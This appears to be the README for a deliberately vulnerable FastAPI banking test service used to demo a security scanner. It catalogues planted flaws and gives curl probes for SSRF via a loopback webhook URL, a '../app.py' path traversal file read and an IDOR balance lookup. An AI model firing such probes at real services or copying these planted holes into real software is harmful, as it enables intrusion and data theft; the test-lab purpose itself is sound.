# 💳 03 - Vulnerable Fintech API (FastAPI)

**Target Port**: `http://localhost:8003`  
**Security Status**: 🟠 **VULNERABLE (HIGH & MEDIUM RISKS)**

---

## 📋 Overview
This backend represents a digital banking & wallet service designed to evaluate SSRF, Path Traversal, and IDOR detection capabilities.

---

## 🚨 Catalog of Injected Vulnerabilities

| Severity | Vulnerability | Endpoint / Vector | CWE / OWASP |
|---|---|---|---|
| 🟠 **HIGH** | **Server-Side Request Forgery (SSRF)** | `POST /api/v1/webhook/test` | CWE-918 / A10:2021 |
| 🟠 **HIGH** | **Path Traversal / Arbitrary File Read** | `GET /api/v1/statements/download?file=` | CWE-22 / A01:2021 |
| 🟠 **HIGH** | **IDOR / Broken Access Control** | `GET /api/v1/accounts/{id}/balance` | CWE-639 / A01:2021 |
| 🟡 **MEDIUM** | **Missing Rate Limiting on PIN Auth** | `POST /api/v1/auth/pin-login` | CWE-307 / A07:2021 |
| 🟡 **MEDIUM** | **Verbose Stack Trace Disclosure** | Global Exception Handler | CWE-209 |
| 🔵 **LOW** | **Permissive CORS Wildcard** | `Access-Control-Allow-Origin: *` | CWE-942 |

---

## 🎯 ThreatLens Demo Attack Probes

### 1. SSRF Probe (Internal Loopback / Metadata Discovery)
```bash
curl -X POST http://localhost:8003/api/v1/webhook/test \
  -H "Content-Type: application/json" \
  -d '{"webhook_url": "http://127.0.0.1:8001/health"}'
```

### 2. Path Traversal Probe
```bash
# Retrieve Python backend source code
curl "http://localhost:8003/api/v1/statements/download?file=../app.py"
```

### 3. IDOR Probe
```bash
# User 1001 viewing VIP account 1003
curl http://localhost:8003/api/v1/accounts/1003/balance
```

---

## 🚀 How to Run
```bash
cd test_backends/03_vulnerable_fintech_py
pip install -r requirements.txt
python app.py
```
